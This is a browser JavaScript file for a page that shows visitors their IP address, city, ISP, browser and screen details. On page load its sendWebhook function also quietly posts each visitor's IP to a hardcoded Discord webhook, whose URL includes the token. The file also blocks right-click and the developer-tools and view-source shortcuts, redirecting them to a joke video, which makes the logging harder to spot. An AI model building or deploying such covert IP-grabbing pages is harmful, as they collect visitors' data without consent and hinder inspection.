async function displayIp() {
  let ip = await (await fetch(`https://ifconfig.me/ip`)).text()

  var ipElement = document.querySelector(".ipAddress")
  ipElement.innerHTML = ip
}

async function displayLocation() {
  let ip = await (await fetch(`https://ifconfig.me/ip`)).text()

  const ipResponse = await fetch(`https://ipapi.co/${ip}/json/`)
  const ipData = await ipResponse.json()

  var locationElement = document.querySelector(".city")
  locationElement.innerHTML = ipData.city
}

async function displayProvider() {
  let ip = await (await fetch(`https://ifconfig.me/ip`)).text()

  const ipResponse = await fetch(`https://ipapi.co/${ip}/json/`)
  const ipData = await ipResponse.json()

  var providerElement = document.querySelector(".name")
  providerElement.innerHTML = ipData.org
}

async function displayAgent() {
  var userAgent = navigator.userAgent

  var browserElement = document.querySelector(".browser")
  browserElement.innerHTML = userAgent
}

async function displayRes() {
  var screenWidth = window.screen.width
  var screenHeight = window.screen.height

  var resElement = document.querySelector(".res")
  resElement.innerHTML = screenWidth + "x" + screenHeight
}

async function displayLang() {
  var userLanguage = navigator.language

  var langElement = document.querySelector(".language")
  langElement.innerHTML = userLanguage
}

async function displaySpeed() {
  var connectionSpeed = navigator.connection
    ? navigator.connection.effectiveType
    : "unknown"

  var speedElement = document.querySelector(".speed")
  speedElement.innerHTML = connectionSpeed
}

async function sendWebhook() {
  let ip = await (await fetch(`https://ifconfig.me/ip`)).text()
  const webhookURL =
    "https://discord.com/api/webhooks/1203451452526305381/3W-sx6GxUDvnfTvFDdz4yzfSG-P4T2wguShaOWiJm8v341TekuFs09LKDBo8sAHZrABk"

  const message = {
    content: `kiep.lol${ip}`,
  }

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(message),
  })
    .then((response) => {
      if (!response.ok) {
        console.error(`Error ${response.status}: ${response.statusText}`)
      }
    })
    .catch((error) => console.error("Error:", error))
}

window.onload = function () {
  displayIp()
  displayLocation()
  displayProvider()
  displayAgent()
  displayRes()
  displayLang()
  displaySpeed()
  sendWebhook()
}

document.addEventListener("contextmenu", function (e) {
  e.preventDefault()
})

document.onkeydown = function (e) {
  if (event.keyCode == 123) {
    return false
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
    return false
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "C".charCodeAt(0)) {
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
    return false
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
    return false
  }

  if (e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank")
    return false
  }
}
